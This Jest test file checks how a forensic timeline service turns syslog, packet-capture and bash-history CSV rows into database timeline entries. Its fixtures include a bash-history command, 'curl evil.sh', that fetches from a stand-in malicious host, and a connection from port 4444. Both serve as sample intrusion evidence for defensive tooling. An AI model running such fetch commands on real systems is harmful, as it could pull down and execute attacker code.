const fs = require('fs'); const os = require('os'); const path = require('path');
const { startPg, describeIfDocker } = require('../helpers/ephemeralPg');
const { importCsvToTimeline } = require('../../src/services/ingestionTimeline');

describeIfDocker('python parser timeline materialization', () => {
  let pool, stop, caseId, resultId;
  const mkResult = async () => (await pool.query(
    `INSERT INTO parser_results (case_id, parser_name, parser_version, input_file, output_data, record_count, created_by)
     VALUES ($1,'p','1','x','[]'::jsonb,0,NULL) RETURNING id`, [caseId])).rows[0].id;
  beforeAll(async () => {
    ({ pool, stop } = await startPg());
    caseId = (await pool.query(`INSERT INTO cases (created_by) VALUES (NULL) RETURNING id`)).rows[0].id;
  }, 60000);
  afterAll(async () => { if (stop) await stop(); });
  beforeEach(async () => { resultId = await mkResult(); });

  test('syslog rows materialize with host_name + description', async () => {
    const csv = path.join(os.tmpdir(), `sl-${Date.now()}.csv`);
    fs.writeFileSync(csv, 'Timestamp,HostName,Program,Pid,Message\n2024-01-02 03:04:05,srv1,sshd,42,Accepted password for root\n');
    const n = await importCsvToTimeline(csv, { pool, caseId, resultId, evidenceId: null, artifactType: 'syslog' });
    expect(n).toBe(1);
    const r = await pool.query(`SELECT host_name, description, raw->>'Program' AS prog FROM collection_timeline WHERE case_id=$1 AND artifact_type='syslog'`, [caseId]);
    expect(r.rows[0].host_name).toBe('srv1');
    expect(r.rows[0].description).toMatch(/Accepted password/);
    expect(r.rows[0].prog).toBe('sshd');
    fs.unlinkSync(csv);
  });

  test('pcap rows get a synthesized src→dst description', async () => {
    const csv = path.join(os.tmpdir(), `pc-${Date.now()}.csv`);
    fs.writeFileSync(csv, 'src_ip,src_port,dst_ip,dst_port,protocol,bytes_sent,bytes_received,packet_count,first_seen,last_seen\n10.0.0.5,4444,93.184.216.34,443,TCP,100,200,5,2024-01-02 03:04:05,2024-01-02 03:05:00\n');
    const n = await importCsvToTimeline(csv, { pool, caseId, resultId, evidenceId: null, artifactType: 'pcap' });
    expect(n).toBe(1);
    const r = await pool.query(`SELECT description, raw->>'dst_ip' AS dst FROM collection_timeline WHERE case_id=$1 AND artifact_type='pcap'`, [caseId]);
    expect(r.rows[0].description).toBe('10.0.0.5:4444 → 93.184.216.34:443 TCP');
    expect(r.rows[0].dst).toBe('93.184.216.34');
    fs.unlinkSync(csv);
  });

  test('bash_history skips timestampless rows, keeps timestamped ones', async () => {
    const csv = path.join(os.tmpdir(), `bh-${Date.now()}.csv`);
    fs.writeFileSync(csv, 'Timestamp,UserName,Shell,Command,SourceFile\n,root,bash,whoami,/root/.bash_history\n2024-01-02 03:04:05,root,bash,curl evil.sh,/root/.bash_history\n');
    const n = await importCsvToTimeline(csv, { pool, caseId, resultId, evidenceId: null, artifactType: 'bash_history' });
    expect(n).toBe(1);   // only the timestamped command
    const r = await pool.query(`SELECT description FROM collection_timeline WHERE case_id=$1 AND artifact_type='bash_history'`, [caseId]);
    expect(r.rows.map(x => x.description)).toEqual(['curl evil.sh']);
    fs.unlinkSync(csv);
  });
});
